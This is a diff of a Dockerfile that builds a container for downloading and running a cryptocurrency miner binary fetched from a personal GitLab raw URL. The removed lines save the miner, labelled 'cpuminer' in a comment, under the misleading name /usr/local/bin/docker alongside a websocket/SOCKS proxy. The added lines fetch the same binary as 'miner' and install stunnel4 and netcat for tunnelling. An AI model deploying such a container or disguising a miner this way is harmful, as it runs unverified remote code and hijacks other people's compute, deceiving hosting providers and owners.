@@ -1,31 +1,19 @@
-FROM ubuntu:24.04
-
-RUN apt-get update && apt-get install -y \
-    libcurl4 \
-    libjansson4 \
-    nodejs \
-    npm \
-    ca-certificates \
-    wget \
-    && rm -rf /var/lib/apt/lists/*
-
-# Download binary cpuminer
-RUN wget -O /usr/local/bin/docker \
-    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
-    && chmod +x /usr/local/bin/docker
+FROM ubuntu:22.04
 
 WORKDIR /app
 
-# Install Node.js dependencies
-RUN npm init -y && npm install ws socks
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    stunnel4 curl wget procps build-essential gcc psmisc netcat-openbsd \
+    && rm -rf /var/lib/apt/lists/*
 
-# Copy files
-COPY wsproxy.js /app/wsproxy.js
-COPY entrypoint.sh /app/entrypoint.sh
+# Miner binary
+RUN wget -O /usr/local/bin/miner \
+    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
+    && chmod +x /usr/local/bin/miner
 
-# Permission
-RUN chmod +x /app/entrypoint.sh
+COPY start.sh .
+RUN chmod +x start.sh
 
-EXPOSE 80
+EXPOSE 11443
 
-ENTRYPOINT ["/app/entrypoint.sh"]
+CMD ["./start.sh"]
